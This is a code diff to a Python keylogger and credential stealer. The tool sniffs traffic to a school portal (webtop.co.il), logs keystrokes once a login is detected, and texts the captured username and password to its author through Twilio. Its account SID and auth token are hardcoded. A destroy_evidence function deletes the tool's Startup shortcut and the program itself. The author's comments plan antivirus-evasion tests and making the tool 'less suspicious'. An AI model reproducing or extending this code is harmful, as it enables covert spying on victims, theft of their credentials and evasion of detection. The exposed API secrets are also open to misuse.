@@ -5,6 +5,7 @@ from pynput.keyboard import Listener  # to use for the keylogger
 # import logging
 import time  # to sleep for 11 seconds while the history page refreshes
 import requests  # to send the password to Twilio so that it can send an sms to me
+import sys
 import os  # find where the history and startup folders are
 
 INTERFACE = ["Ethernet", "Wi-Fi"]
@@ -160,9 +161,9 @@ def delete_history():
 
 def send_sms():
     """Sends a request to Twilio through the requests package of python to send an SMS to me. """
-    global username_and_password
     """By using the requests package, the function sends a post request to Twilio which sends an sms to me with the 
     info of the password"""
+    global username_and_password
     account_sid = "ACdfeb6cf0756bca90fdaa4e4904e26276"
     # os.environ['ACCOUNT_SID']
     authentication_token = "1570aa988b247bc39446d1e1080d5164"
@@ -201,9 +202,10 @@ def destroy_evidence():
     global PATH_TO_PROGRAM
     """This function will restore all the settings before the download of the program,
      the shortcut and the program itself"""
-    os.system(f'icacls "{STARTUP_DIRECTORY}" /reset /t')
-    os.remove(rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk")
-    os.remove(rf"{PATH_TO_PROGRAM}")
+    # os.system(f'icacls "{STARTUP_DIRECTORY}" /reset /t')
+    # os.remove(HISTORY_FILE + '-logs.txt')
+    # os.remove(rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk")
+    # os.remove(rf"{PATH_TO_PROGRAM}")
 
 
 def main():
@@ -214,18 +216,21 @@ def main():
     print('start')
     addr1 = socket.gethostbyname('webtop.co.il')
     sniff(iface=INTERFACE, filter=f"host {addr1}", count=30)
-    a = threading.Thread(target=run_keylogger, daemon=True)
-    a.setDaemon(True)
-    a.start()
+    tracker = threading.Thread(target=run_keylogger, daemon=True)
+    tracker.setDaemon(True)
+    tracker.start()
 
     while 1:
         sniff(iface=INTERFACE, filter=f"host {addr1}", count=20)
+        checking_history = threading.Thread(target=check_history)
+        checking_history.start()
         logged_in = check_history()
         if logged_in:
             # send_sms()
             # Leaving log function for now, if I have a use for storing with log instead of variable
             # log()
             destroy_evidence()
+            sys.exit()
 
 
 if __name__ == "__main__":
@@ -245,17 +250,15 @@ if __name__ == "__main__":
 
 # 4) Check for bugs in general
 
-# 5) Find a way for python to send message through twilio api - the library adds 3 mega bytes
-
-# 6) Change the code so it will rename the history file and after the process is completed switch it back,
+# 5) Change the code so it will rename the history file and after the process is completed switch it back,
 # to make it less suspicious.
 
-# 7) Add for keylogger delete button that erases key after the cursor
+# 6) Add for keylogger delete button that erases key after the cursor
 
-# 8) Add a function that checks if the variable is close to reaching the max amount for a string (or for SMS),
+# 7) Add a function that checks if the variable is close to reaching the max amount for a string (or for SMS),
 # then puts it in a txt
 
-# 9) Test to see if avast and other antivirus programs allow to download an html page and then turn it to exe file after
+# 8) Test to see if avast and other antivirus programs allow to download an html page and then turn it to exe file after
 # it was downloaded
 
 
@@ -273,3 +276,4 @@ if __name__ == "__main__":
 # 2) DONE  check for wifi or ethernet interface, it could be any one of those
 # 3) Find way, after restart, to not delete history but only after first encounter
 # 4) Use Twilio without the helper package - it takes too much and the download time take too long
+# 5) The program will remove all traces of itself, the shortcut and any settings changes it did
